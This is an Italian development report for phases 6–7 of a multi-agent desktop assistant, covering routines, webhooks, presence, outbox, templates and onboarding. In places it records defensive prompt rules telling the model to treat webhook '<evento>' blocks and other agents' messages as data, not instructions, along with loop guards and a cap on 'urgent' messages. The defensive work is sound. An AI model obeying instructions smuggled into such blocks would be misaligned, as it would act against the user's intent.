| **5** tab Routine: elenco con trigger in linguaggio naturale, prossima esecuzione, stato (attiva/in pausa/in pausa per assenza), pausa/ripresa (azione utente, nessuna card), editor per schedule/email/calendar_event/webhook (token copiabile)/poll avanzato | fatto | `Settings.tsx` `RoutinesTab`+`TriggerEditor` (746+), `describeTrigger`/`describeEverySchedule` (`cron-human.ts:96,111`), `next_run` e `webhook_url` calcolati dal daemon (`api.ts` routines:list/create-trigger/update-trigger) · test cron-human (+3) |
| **5** impostazioni: fuso orario, finestre di consegna, minAwayHours, giorni pausa per assenza, notifiche per agente | fatto | GeneralTab "Consegna e presenza" + "Notifiche per agente" (`Settings.tsx:402,456`) via settings:get/set |
| **6** test di tutte le aree | fatto | 95 nuovi: `tz-triggers` (22), `triggers` shared (17), `webhooks` (7), `polls` (12), `presence` (13), `outbox` (9), `notifications` (8), `loop` (+4), `cron-human` (+3), `permissions` (+3), `vault-keychain` (8, residui) |

## Verifica manuale (daemon reale standalone + probe ws, come nelle fasi 2/5)

Directory dati temporanea, provider Ollama locale (`gpt-oss:120b-cloud`), nessun account esterno autorizzato:

1. **Routine schedule 'around' fuso Europe/Rome:** creata alle 22:57 locali con at 23:00 → `routines:list` mostra `next_run` = **domani 23:04 Roma**: l'occorrenza di oggi (23:00 − 11 min di jitter deterministico = 22:49) era già passata alla creazione e viene saltata correttamente. Una seconda routine at 23:15 (jitter −14) ha `next_run` **stasera 23:01** — ed è davvero PARTITA alle 23:01 (turno nel transcript, job done).
2. **Webhook con curl:** token sbagliato → **401**; corpo di 65.537 byte → **413**; token giusto → `{"ok":true}` e il turno parte col blocco `<evento>` nel prompt: il modello ha risposto via send_to_user citando i dati del corpo (repo/commit). Token e URL restituiti dalla RPC di creazione (`webhook_url` + `curl` copiabile dalla UI).
3. **Rientro simulato** (impostando `presence.lastSeen` a 13 ore prima e inviando `presence:signal`): send-message FISSA "Do un'occhiata in giro…" → widget "Ho messo in pausa le tue routine… Le riattivo?" → turno look-around vero (il modello chiama `search_connectors`, riferisce, offre un connettore con offer_connector, chiude FINISHED). Con `mainAgentId` assente il look-around è andato al primo agente (senza provider): notice onesta "Configura prima un provider".
4. **Extra dal vivo:** assenza di 8 giorni → il tick dello scheduler ha messo in pausa TUTTE le routine con `paused_for_away=1`; risposta "Riattiva tutte" al widget → le 4 routine riattivate + notice "Routine riattivate: 4."; webhook con risposta NON urgente → entry `held:true` in outbox (invisibile) → `outbox:opened` (apertura chat) consegna con la riga **"Mentre eri via:"**. Log del daemon: nessun errore; SIGTERM pulito.

## REPORT FASE 6

- **File modificati/creati:**
  - `src/shared/types.ts` — tipi dei trigger (ScheduleTrigger/ConnectorPollTrigger/Webhook/PresenceReturn, TriggerEventPayload), evento `agent-notify`, `RoutineInfo` con trigger/next_run/webhook_url, API presence/outbox/settings.
  - `src/shared/triggers.ts` — **nuovo** — logica pura: jitter deterministico, estrazione per percorso, guess start/titolo, euristiche preset (choosePollTool/chooseQueryArgName, nessun nome cablato), validazione forma, `formatTriggerEvent`, set dei visti.
  - `src/shared/cron-human.ts` — `describeEverySchedule` + `describeTrigger` (trigger in linguaggio naturale per la UI).
  - `src/daemon/tz.ts` — **nuovo** — fusi orari con Intl: tzParts, offsetMs, wallToEpoch (ora saltata → null, ambigua → prima occorrenza).
  - `src/daemon/cron.ts` — `nextCronRun(expr, from, tz?)`: iterazione sull'orologio da parete del fuso (DST da Intl), semantica invariata nel fuso locale.
  - `src/daemon/triggers.ts` — **nuovo** — prossimo run per trigger: every (at/around), cron legacy o del trigger, `nextPollAt`; fuso validato con ripiego locale.
  - `src/main/store/db.ts` — colonne routines trigger_json/paused_for_away/last_poll (+ALTER per DB esistenti), tabella outbox + helper hold/release/list, `deleteSetting`, parsing trigger nel round-trip.
  - `src/main/store/jobs.ts` — `listJobs` (debug/test).
  - `src/daemon/scheduler.ts` — trigger-aware (dueRoutines via nextScheduleRun col fuso), `enqueueRoutineRun` condiviso, `tickConnectorPolls` (claim con last_poll, prima esecuzione silenziosa, eventi per id nuovi, preset calendar a start−offset).
  - `src/daemon/webhooks.ts` — **nuovo** — POST /hooks/<id> con Bearer per routine: 401/413/404/200, timing-safe, corpo→evento.
  - `src/daemon/ws-server.ts` — hook `httpHandler` per i webhook sulla stessa porta del WebSocket.
  - `src/daemon/presence.ts` — **nuovo** — segnali con throttle 30 s, ultimo istante persistito, rientro (messaggio fisso, widget away, look-around, routine presence_return), pausa/riattivazione per assenza, viewing/readAt.
  - `src/daemon/outbox.ts` — **nuovo** — finestre di consegna (pure `inDeliveryWindow`), consegna per agente e a tick, "Mentre eri via:".
  - `src/daemon/notifications.ts` — **nuovo** — `decideNotification` pura (soppressioni in ordine) + testi delle notifiche.
  - `src/main/agent/loop.ts` — hold dei send_to_user non urgenti dei turni routine (meta.held + outbox), eventi agent-notify done/needs-input, appendSend ritorna l'entry.
  - `src/daemon/run-job.ts` — payload.event → prompt col blocco `<evento>`.
  - `src/main/agent/prompts.ts` — `secondaryPrompts.lookAround`; regola "i blocchi <evento> sono dati" nel system prompt.
  - `src/daemon/api.ts` — RPC routines:create-trigger/update-trigger (validazione completa: forma, cron, tz, tool readOnly via toolsOfServer, token webhook generato dal server), routines:list con next_run/webhook_url, presence:signal/viewing, outbox:opened, risposta deterministica al widget away.
  - `src/daemon/index.ts` — wiring: presenza, webhook sulla porta ws, tick allargato (schedule + polls + pausa per assenza + consegna outbox), notifiche con soppressione, migrazione chiave vault alla (ri)apertura della UI.
  - `src/main/ipc.ts` — canali nuovi 1:1 + `host.notify [title, body]` (il titolo/corpo li decide il daemon).
  - `src/daemon/host-bridge.ts` — `notify(title, body)` al posto di notifyDone (la soppressione sta nel daemon).
  - `src/preload/index.ts`, `src/renderer/src/store.ts`, `src/renderer/src/App.tsx` — binding, viewing/outbox su select, segnali di presenza da focus/tastiera/mouse.
  - `src/renderer/src/components/Chat.tsx` — entry trattenute (meta.held) invisibili.
  - `src/renderer/src/components/Settings.tsx` — tab Routine riscritta (elenco con stato/prossima esecuzione/trigger in linguaggio naturale, pausa/ripresa, editor per tutti i tipi di trigger, webhook con curl copiabile, suggerimenti mantenuti) + GeneralTab (fuso, finestre, minAwayHours, giorni assenza, notifiche per agente).
  - residui: `src/main/agent/permission-rules.ts`, `permissions.ts`, `src/main/mcp/index.ts` (annotazioni solo catalogo), `src/daemon/keychain.ts` (voci multiple), `src/main/vault.ts` (chiave nel Keychain + migrazione).
  - test nuovi: `src/daemon/__tests__/{tz-triggers,webhooks,polls,presence,outbox,notifications}.test.ts`, `src/shared/__tests__/triggers.test.ts`, `src/main/__tests__/vault-keychain.test.ts`; estesi `loop.test.ts`, `permissions.test.ts`, `cron-human.test.ts`.
- **Decisioni prese e perché:** (1) **Ora ambigua → PRIMA occorrenza, ora saltata → occorrenza saltata**: gli scheduler standard si comportano così e i test DST lo fissano; il two-pass semplice convergeva sulla SECONDA occorrenza delle 02:30 di ottobre, corretto con candidati dagli offset prima/dopo la transizione (probe ±12 h); (2) l'**around** parte dal giorno di `from − 15 min`: un'occorrenza base appena passata può avere jitter positivo che la proietta nel futuro, e non va persa (test dedicato); (3) i **webhook si accodano e non si scartano** se l'agente è occupati (diversamente dalle routine a schedule): l'evento è one-shot, perderlo sarebbe peggiore di ritardarlo — la coda jobs già serializza per agente; il corpo entra comunque nel blocco `<evento>` come dato; (4) la **prima esecuzione del preset calendar NON è silenziosa** sugli eventi futuri: l'utente che crea "avvisami 10 min prima" vuole copertura sugli eventi delle prossime 24h; la prima-silenziosa resta per il poll generico/email (evita il burst del backlog); (5) il **widget di riattivazione è di sistema** (creato dal daemon con meta.awayResume, risposta gestita deterministicamente in widget:respond): lasciare il resume al modello avrebbe significato card di approval per ogni routine, contraddicendo la ripresa "solo quelle messe in pausa dal sistema"; (6) **notifica agent-done solo se ci sono send-message NON trattenute**: un messaggio in outbox non è stato visto, notificarlo svelerebbe la consegna rinviata (dichiarato nei limiti: alla consegna non c'è notifica); (7) il token webhook vive nel trigger_json (visibile alla UI che deve copiarlo): protegge hook locali loopback, come il token di daemon.json protegge le RPC; (8) `presence:viewing` vale anche come segnale 'active' e segna la chat letta (readAt per la soppressione "già letto"); (9) il **cron del trigger finisce anche nella colonna schedule** (compatibilità con la UI di update_state pre-fase 6), i non-cron lasciano la colonna vuota e lo scheduler guarda solo il trigger quando c'è.
- **Deviazioni dalla specifica e perché:** (1) la verifica manuale è avvenuta col daemon standalone + probe ws invece di `npm run dev`: click sui bottoni DOM di Electron notoriamente inaffidabili (fasi 3–5); la catena RPC è identica a quella dell'app; (2) `describeEverySchedule`/`describeTrigger` coprono le forme comuni e ripiegano su forme grezce per i casi irregolari (coerente con describeCron della fase 4); (3) il preset calendar estrae l'inizio evento dai nomi di campo comuni (start/dateTime/…): la forma delle risposte dei server Google non è nota a priori e la specifica vieta nomi inventati — se il campo non si riconosce l'evento viene scartato silenziosamente (limito il danno: nessun job con orario sbagliato); (4) il jitter del mode 'around' per `every:'hour'` è per GIORNO (seed id+data, come da spec) e quindi uguale su tutte le ore dello stesso giorno: la spec lega il seed alla data, non all'occorrenza.
- **Output di typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito (exit 0); vitest `Test Files 42 passed (42)` / `Tests 461 passed (461)`; build `✓ built` ×3 — `out/main/index.js 18.97 kB`, `out/main/daemon.js 245.40 kB`, preload 4.71 kB, renderer 1.248,92 kB.
- **Cosa NON è stato verificato:** (1) il rendering visivo della tab Routine riscritta e di GeneralTab non è stato ispezionato a schermo (dati e payload verificati via RPC/test; click DOM in Electron inaffidabili, come da fasi 3–5); (2) i preset email/calendar_event END-to-END con Gmail/Calendar veri: servono i connettori Google static (client OAuth dell'utente, Developer Preview) — la scelta euristica del tool, la validazione readOnly e il ciclo completo dei poll sono coperti dai test con MCP finto e l'euristica lavora sui tool reali esposti da `connectors:list` (Cloudflare connesso nel DB di sviluppo dell'app); (3) la notifica NATIVA agent-done/needs-input non è stata vista apparire a schermo (soppressione e testi coperti da test; il percorso osascript senza UI è lo stesso delle fasi precedenti); (4) il pacchetto dist/dmg (invariato); (5) la pausa per assenza LUNGA sui giorni veri è stata simulata col setting presence.lastSeen, non aspettando 7 giorni (ovviamente).
- **Problemi fuori scope notati:** (1) `trigger.seen.<id>` resta nel DB quando la routine viene eliminata (settings orfani, innocui); (2) il look-around su un agente senza provider produce solo la notice di configurazione: nessun retry quando il provider viene impostato; (3) le finestre di consegna non hanno tz esplicito per agente (solo userTimeZone globale); (4) `agents:delete` non rimuove le righe outbox dell'agente (le entry muoiono col DELETE entries, ma le righe outbox orfane restano: innocue, filtered by agent); (5) il ws-server resta mono-client (noto dalle fasi precedenti: la probe calcia la finestra dell'app, che si riprende con l'evento reconnected); (6) gpt-oss tende a mettere `urgent:true` nei send_to_user dei turni automatici, bypassando l'outbox: comportamento del modello (il prompt descrive urgent come opzionale), nessun intervento forzato; (7) node-cron inutilizzato e avvisi rollup INEFFECTIVE_DYNAMIC_IMPORT (invariati dalle fasi precedenti).

# Fase 7 — Bot principale, template, kickstart, onboarding

**Data:** 2026-10-27 · **Commit:** `fase 7: residui` (898b47f) + `fase 7: bot principale e template` · **Tag:** `fase-7`
**Scope:** §3bis L4 (bot principale + template per ruolo), L8 (messaggi tra agenti) + §3ter T2/T3 (onboarding), T4 (kickstart e prompt delle routine), Appendice A (catalogo dei template); prima del resto i residui (commit separato).
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **522 test, 48 file, tutti verdi** (472 post-residui + 50 nuovi) · `npm run build` verde · **flusso verificato dal vivo col daemon reale + Ollama locale** (vedi sotto).

## Residui (commit `fase 7: residui`, 898b47f)

- **0a — Poll su server non verificati.** Campo `userConfirmedReadOnly` sul trigger connector_poll (`src/shared/types.ts:345`); il gate è la funzione pura `manualServerPollError` (`src/shared/triggers.ts:193`): per i server NON del catalogo (senza `catalogId`) la creazione/modifica del trigger richiede la conferma esplicita, altrimenti rifiuto con messaggio chiaro (`src/daemon/api.ts:96` dentro `validateTrigger`). L'editor della UI chiede la casella "Confermo che questo tool legge soltanto e non modifica nulla" quando il connettore scelto è un server manuale — aggiunti alla dropdown anche i server MCP manuali (`src/renderer/src/components/Settings.tsx:1032,1085` e opzioni "(server manuale)"). Test: `triggers.test.ts` (+3 puri) e `trigger-validation.test.ts` (nuovo, 4 su store reale con client MCP finto: catalogo ok / manuale senza conferma rifiutato / con conferma ok / update segue la stessa regola).
- **0b — Uso eccessivo di urgent.** Nei turni automatici (`source === 'routine'`) al massimo UN `urgent` per esecuzione: il primo passa, i successivi diventano non urgenti e finiscono trattenuti in outbox come gli altri (`src/main/agent/loop.ts:191,396`). Il system prompt definisce urgent ("SOLO se l'utente deve agire entro poche ore", `prompts.ts`) e la descrizione del tool segue (`tools.ts`). Test: `loop.test.ts` (+2: due urgent in routine → solo il primo immediato; nei turni utente niente tetto).
- **0c — Pulizia alla cancellazione di un agente.** `deleteAgent` (`src/main/store/db.ts:181-191`) rimuove anche le righe outbox dell'agente e i setting `trigger.seen.<routineId>` delle sue routine — con le routine stesse: togliere i seen di routine vive sarebbe sbagliato e le routine orfane continuerebbero a far girare poll per un agente morto (decisione, vedi sotto). Test: `delete-agent.test.ts` (nuovo, store reale: outbox/seen/routine dell'agente via, quelle dell'altro restano).

## Tabella punto per punto della specifica

| Punto | Stato | Dove |
|---|---|---|
| **0a** connector_poll su server manuale richiede `userConfirmedReadOnly: true`, casella nella UI, rifiuto chiaro | fatto | `shared/triggers.ts:193` (pura) + `daemon/api.ts:96` + `Settings.tsx:1078-1090` · test `trigger-validation.test.ts`, `triggers.test.ts` |
| **0b** turni automatici: max 1 urgent per esecuzione, i successivi trattenuti non urgenti; urgent definito nel prompt | fatto | `loop.ts:191,390-405` + `prompts.ts:26` + descrizione tool `tools.ts:19` · test `loop.test.ts` |
| **0c** agents:delete rimuove righe outbox e `trigger.seen.<id>` delle routine | fatto | `db.ts:181-191` (+ routine dell'agente) · test `delete-agent.test.ts` |
| **1** bot principale unico, badge nella UI, "Rendi principale" dalle impostazioni dell'agente | fatto | RPC `agents:set-main` (`api.ts:124`) + badge ★ in `Sidebar.tsx:64-68` e in `AgentsTab` (`Settings.tsx:629-640`) · test `create-from-template.test.ts` (il cambio SOSTITUISCE) |
| **1** sezione aggiuntiva del system prompt del principale | fatto | `mainAgentSection` (`prompts.ts:84`, pura) agganciata in `loop.ts:252-266` · test `loop.test.ts` (testo esatto della spec) |
| **1** elenco degli altri bot (nome, descrizione, routine attive) nel prompt del principale | fatto | `loop.ts:258-264` (solo routine `enabled`) · test `loop.test.ts` |
| **2** `send_to_agent({agentId, text})` accoda job user-message con initiator AGENT, fromAgentId, hop | fatto | intercettato dal loop (`loop.ts:486-535`) → `enqueueJob` col payload completo · test `loop.test.ts` + live |
| **2** testo del destinatario nel blocco `<messaggio_da_agente nome>` come EVIDENZA con la regola L8 | fatto | `formatAgentMessage`/`AGENT_MESSAGE_RULE` (`shared/agent-message.ts:27-40`) · test `agent-message.test.ts` |
| **2** il mittente compare nella chat del destinatario come entry distinta "Da \<nome bot\>", non come messaggio utente | fatto | meta `fromAgentId/fromAgentName/hop` sull'entry (`loop.ts:216-218`) + rendering dedicato `Chat.tsx:196-209` |
| **2** protezione cicli: hop massimo 3 (hop 3 non genera altri), max 10 messaggi/coppia/ora → errore leggibile, niente accodamento | fatto | `agentSendGuard` + `countPairMessagesLastHour` (`shared/agent-message.ts:57-94`) nel loop (`loop.ts:510-516`) · test `agent-message.test.ts` + `loop.test.ts` |
| **2** permesso always_allow verso agenti dello stesso utente | fatto | regola default in `db.ts` (`send_to_agent`/`list_agents` always_allow) + intercettazione nel loop prima del gate (come gli altri tool di comunicazione) |
| **2** `list_agents()`: nome, id, descrizione e stato degli altri bot | fatto | def in `tools.ts:235-242`, esecuzione `tools.ts` (case `list_agents`) |
| **3** formato JSON del template (id, name, description, avatar, roles, routines+askUserFor, connectors, memories, skills) | fatto | `BotTemplate` (`shared/types.ts:389-416`) + 6 file `src/main/templates/<id>.json` |
| **3** trigger solo schedule (cron/every): poll e webhook solo dall'utente | fatto | `validateTemplate` rifiuta i non-schedule (`templates/index.ts:63-71`) · test `templates.test.ts` |
| **3** validazione dello schema (pura, testata) + caricamento all'avvio del daemon | fatto | `validateTemplate`/`loadTemplates` (`templates/index.ts:26-106`), `loadTemplates()` al boot (`daemon/index.ts:156`, fail-fast) · test `templates.test.ts` |
| **3** 6 template ORIGINALI: inbox-manager, chief-of-staff, daily-briefing, meeting-prep, executive-assistant, mention-monitor | fatto | i 6 JSON in `src/main/templates/` (testi nostri ispirati all'Appendice A) · test: i 6 passano la validazione, connettori citati tutti nel catalogo |
| **3** ogni routine segue la struttura del prompt "Daily mention monitor" (ruolo → pausa → memoria → fonti/fallback → anti-invenzione → consegna/soglia/silenzio → ledger → trigger) | fatto | campo `content` di ogni routine · test `templates.test.ts` (PAUSA/memoria/anti-invenzione/silenzio/ledger/trigger presenti in tutte) |
| **3** memorie del template = regole operative atomiche e datate | fatto | `memories[].created_at` in formato data + contenuto regola · test `templates.test.ts` |
| **3b** update_state routine create accetta `trigger` opzionale SOLO schedule (stessa validazione delle routine utente); nasce in pausa con provenance 'template'/'agent' | fatto | `runRoutineAction` create (`tools.ts:308-347`) · test `update-state.test.ts` (+4: cron/every/webhook rifiutato/malformati) |
| **4** creare un bot da template inietta come PRIMO messaggio il JSON in `<bot_template_setup_context>` e le istruzioni in `<bot_template_setup_instructions>` | fatto | `buildKickstartMessage` (`templates/index.ts:152-186`, pura) → job user-message (`api.ts:134-156`) · test `templates.test.ts` + `create-from-template.test.ts` + live |
| **4** le 10 istruzioni di T4 riscritte per i nostri tool | fatto | `kickstartInstructions` (`templates/index.ts:113-137`) · test sul contenuto + rispettate dal vivo (routine in pausa provenance template, domanda a testo semplice, search_connectors prima delle offerte, UNA card per Gmail, memorie log/agent, "pronto" + askUserFor) |
| **4** initiator TEMPLATE_IMPORT; la UI NON lo mostra come utente: riga espandibile "Configurazione da template: \<nome\>" | fatto | payload.initiator + extraMeta.templateName (`api.ts:143-149`) → meta entry (`loop.ts:216-219`, `run-job.ts`) → `Chat.tsx:208-221` |
| **4** il kickstart parte come job della coda: riavvio a metà → riprende come gli altri turni | fatto | `enqueueJob` kind user-message (stessa tabella jobs di fase 2, ripresa via payload.entryId) · test `create-from-template.test.ts` (job in coda) |
| **5** nessun agente → crea il bot principale "Bot" (mainAgentId) + widget DI SISTEMA "Per cosa vuoi usarmi di più?" (4 opzioni + Altro allowCustom) | fatto | `maybeStartOnboarding` (`onboarding.ts:83-99`) al boot del daemon (`index.ts:222`) · test `onboarding.test.ts` + live |
| **5** alla risposta: mappa ruolo → 2 template (pura, testata) crea i due bot da template col kickstart; benvenuto FISSO che li presenta in una riga ciascuno | fatto | `roleTemplates`/`welcomeMessage`/`completeOnboarding` (`onboarding.ts:36-54,140-166`) · test + live |
| **5** senza provider: onboarding fermo con widget che porta alle impostazioni del provider, riprende quando il provider è configurato | fatto | `answerOnboardingRole`/`resumeOnboarding` (`onboarding.ts:103-138`), resume su `providers:save` (`api.ts`) e al boot; card dedicata che apre il tab provider (`Chat.tsx` ProviderWidgetCard + `settingsTab` nello store) · test `onboarding.test.ts` |
| **6** test di tutte le aree | fatto | 50 nuovi: `agent-message` (8), `templates` (15), `onboarding` (9), `create-from-template` (4), `trigger-validation` (4), `delete-agent` (2), +8 in `loop`, +4 in `update-state`, +2 in `run-job`, +3 in `triggers` |

## Verifica manuale (daemon reale standalone + probe ws, come nelle fasi 2/5/6)

Directory dati temporanea vuota, provider Ollama locale (autodiscoverato al boot, primo modello assegnato), nessun account esterno autorizzato, nessun browser usato:

1. **Primo avvio su dati vuoti:** il daemon crea solo il bot principale **"Bot"** con `mainAgentId` impostato e nella sua chat il widget DI SISTEMA **"Per cosa vuoi usarmi di più?"** (meta `onboardingRole`, 4 opzioni + campo libero).
2. **Risposta "Email":** nascono **Gestore della posta in arrivo** e **Capo dello staff** (i due template della mappa) e il bot principale manda il **benvenuto fisso** che li presenta in una riga ciascuno.
3. **Kickstart di inbox-manager (LLM reale, transcript):** presentazione breve → `update_state` create → evento "Routine creata (in pausa): Sgocciolamento della posta" → `search_connectors` → 3× `update_memory` (tier log) → card **Gmail** offerta (why del template) → "Pronto… Vuoi attivarla?". `routines:list`: `enabled:0, provenance:'template', trigger {schedule cron "45 7 * * 1-5"}`. Il messaggio TEMPLATE_IMPORT è nel transcript con `templateName` (la UI lo mostra espandibile, non come utente).
4. **Extra dal vivo (§3bis L8):** chiesto al bot principale di delegare il controllo posta → `list_agents` + `send_to_agent` → il Gestore riceve `<messaggio_da_agente nome="Bot">` (hop 1), chiama `list_agents`, **risponde al mittente** con send_to_agent (hop 2) senza trattare il messaggio come parole dell'utente ("leggo e preparo solo su richiesta dell'utente", citando le regole scritte in memoria dal kickstart) → il principale riepiloga all'utente la risposta. Chiusura SIGTERM pulita (daemon.json e lock rimossi).

## REPORT FASE 7

- **File modificati/creati:**
  - `src/shared/agent-message.ts` — **nuovo** — logica pura dei messaggi tra agenti: blocco evidenza con la regola L8, guardia anti-ciclo (hop 3, 10/h per coppia), conteggio per coppia, versione display per la UI.
  - `src/daemon/onboarding.ts` — **nuovo** — onboarding primo avvio: bot principale + widget ruolo (pura la mappa ruolo→template e il benvenuto), parcheggio sul provider e ripresa, creazione dei 2 bot + kickstart.
  - `src/main/templates/index.ts` — **nuovo** — validazione pura dei template (solo trigger schedule, cron verificato), caricamento (fail-fast al boot), messaggio e istruzioni di kickstart.
  - `src/main/templates/{inbox-manager,chief-of-staff,daily-briefing,meeting-prep,executive-assistant,mention-monitor}.json` — **nuovi** — i 6 template originali: routine con la struttura T4 completa, memorie datate, connettori solo del catalogo.
  - `src/main/agent/loop.ts` — tetto urgent nei turni automatici (0b), send_to_agent con guardie e accodamento, meta agentMessage/extraMeta, sezione del bot principale nel system.
  - `src/main/agent/tools.ts` — def send_to_agent/list_agents + esecuzione list_agents, update_state create con trigger schedule e provenance template, descrizione urgent.
  - `src/main/agent/prompts.ts` — definizione di urgent, sezione "Gli altri bot", `mainAgentSection` (pura).
  - `src/main/store/db.ts` — deleteAgent pulisce outbox/trigger.seen/routine (0c), permessi default dei tool nuovi, provenance 'template'.
  - `src/shared/types.ts` — `userConfirmedReadOnly`, `BotTemplate`/`TemplateInfo`, provenance template, API mainAgent/template.
  - `src/shared/triggers.ts` — `manualServerPollError` (pura, 0a).
  - `src/daemon/api.ts` — gate 0a in validateTrigger, agents:set-main, templates:list, agents:create-from-template, widget onboarding deterministici, resume su providers:save.
  - `src/daemon/index.ts` — loadTemplates al boot + onboarding cablato (maybeStart/resume).
  - `src/daemon/run-job.ts` — payload initiator/fromAgent/hop/extraMeta → opzioni del turno.
  - `src/main/ipc.ts`, `src/preload/index.ts` — canali/binding delle RPC nuove.
  - `src/renderer/src/store.ts` — mainAgentId (badge), setMainAgent, settingsTab (il widget provider apre il tab giusto).
  - `src/renderer/src/components/Sidebar.tsx` — badge ★ principale (main effettivo: setting o primo agente).
  - `src/renderer/src/components/Settings.tsx` — "Rendi principale", creazione bot da template, server manuali nel dropdown poll + casella di conferma 0a.
  - `src/renderer/src/components/Chat.tsx` — entry "Da \<nome bot\>", riga espandibile "Configurazione da template", ProviderWidgetCard.
  - test nuovi: `shared/__tests__/agent-message.test.ts`, `main/templates/__tests__/templates.test.ts`, `daemon/__tests__/{onboarding,create-from-template,trigger-validation}.test.ts`, `main/store/__tests__/delete-agent.test.ts`; estesi `loop.test.ts`, `update-state.test.ts`, `run-job.test.ts`, `triggers.test.ts`.
- **Decisioni prese e perché:** (1) **deleteAgent rimuove anche le routine** dell'agente oltre a outbox e trigger.seen: i seen appartengono alle routine (toglierli da routine vive le farebbe ri-basare) e le routine orfane continuerebbero a far girare poll/schedule per un agente inesistente; (2) **l'onboarding assegna il primo provider attivo e il suo primo modello** ai tre bot creati: senza, il kickstart morirebbe sulla notice "configura un provider" e il flusso del primo avvio non partirebbe mai; (3) **i widget di sistema dell'onboarding sono deterministici** (come awayResume in fase 6): la risposta al ruolo non apre un turno del modello (non c'è nulla da generare: la mappa e il benvenuto sono fissi) e il bottone del provider apre le Impostazioni; (4) **send_to_agent è intercettato dal loop prima del gate** come gli altri tool di comunicazione (il permesso always_allow delle regole default resta come cintura): accoda un job, non ha effetti fuori dal sistema; (5) **il conteggio per coppia considera entrambe le direzioni** sui transcript di entrambi gli agenti nell'ultima ora; (6) **il catalogo template si valida al boot** (fail-fast): un JSON rotto ferma il daemon con l'errore preciso invece di sorprendere al primo kickstart; (7) i **server MCP manuali entrano nella dropdown dei poll**: senza, la casella 0a sarebbe irraggiungibile dalla UI (prima si poteva scegliere solo il catalogo); (8) il **worker gira a tick di 1 s**: i job accodati da send_to_agent partono senza poke esplicito dal loop (il loop non ha referenza del worker); (9) il **benvenuto e i widget di onboarding sono entry send-message di sistema** (appendSystemSend), visibili e coerenti col look-around di fase 6.
- **Deviazioni dalla specifica e perché:** (1) la verifica manuale è avvenuta col daemon standalone + probe ws invece di `npm run dev`: click sui bottoni DOM di Electron notoriamente inaffidabili (fasi 3–6); la catena RPC è identica a quella dell'app; (2) aggiunta una piccola **sezione "crea da template" nella tab agenti**: la specifica descrive il comportamento del "creare un bot da template" ma fuori dall'onboarding non c'era entry point per provarlo/usarlo; (3) `avatar` dei template è un emoji (nessuna fonte ufficiale di logotipi stabili) e al momento non è renderizzato in sidebar: campo pronto, nessuna UI inventata oltre la richiesta; (4) i template citano SOLO connettori del catalogo verificato (gmail/gcalendar/gdrive); mention-monitor non offre connettori perché il catalogo non ha una fonte di menzioni pubblica — la sua routine dichiara la ricerca web come fallback, che passa da run-command; (5) come da convenzione delle fasi precedenti, i residui sono in un commit separato.
- **Output di typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito (exit 0); vitest `Test Files 48 passed (48)` / `Tests 522 passed (522)`; build `✓ built` ×3 — `out/main/index.js 19.04 kB`, `out/main/daemon.js 291.56 kB`, preload `4.94 kB`, renderer `1.258,18 kB` (avvisi `INEFFECTIVE_DYNAMIC_IMPORT` preesistenti, cosmetici).
- **Cosa NON è stato verificato:** (1) il rendering visivo a schermo di badge ★, template picker, righe "Da \<nome bot\>"/"Configurazione da template" e ProviderWidgetCard (dati, payload e meta verificati via RPC dal vivo e dai test; click DOM in Electron inaffidabili, come da fasi 3–6); (2) il ramo onboarding SENZA provider DAL VIVO: Ollama attivo viene autodiscoverato al boot e il gate non resta osservabile su questa macchina — coperto dai test con dipendenze finte (parcheggio, ripresa a providers:save, provider disabilitato non conta); (3) la card di approval del resume dopo un "sì" dell'utente alla domanda di attivazione (la domanda è stata posta dal vivo; la card di resume era già stata verificata in fase 4); (4) il pacchetto dist/dmg (invariato rispetto alle fasi precedenti).
- **Problemi fuori scope notati:** (1) il kickstart assegna il primo modello dell'elenco del provider (kimi-k2.7-code:cloud nella verifica): scelte di modello più fini restano all'utente nella tab agenti; (2) `run-command` nei turni automatici (ricerca web del mention-monitor) chiede approvazione che nessuno dà di notte: il tool va in timeout dopo 5 minuti con notice (preesistente, già notato in fase 1); (3) l'hop si conta per catena di turni, ma una catena voluta può ripartire da un nuovo messaggio dell'utente (limite per esecuzione, come da spec); (4) `roleTemplates` mappa 'lavoro-codice' e 'ricerca-aggiornamenti' sulla stessa coppia per mancanza di template più specifici nel catalogo a sei; (5) il ws-server resta mono-client e node-cron resta inutilizzato (invariati).
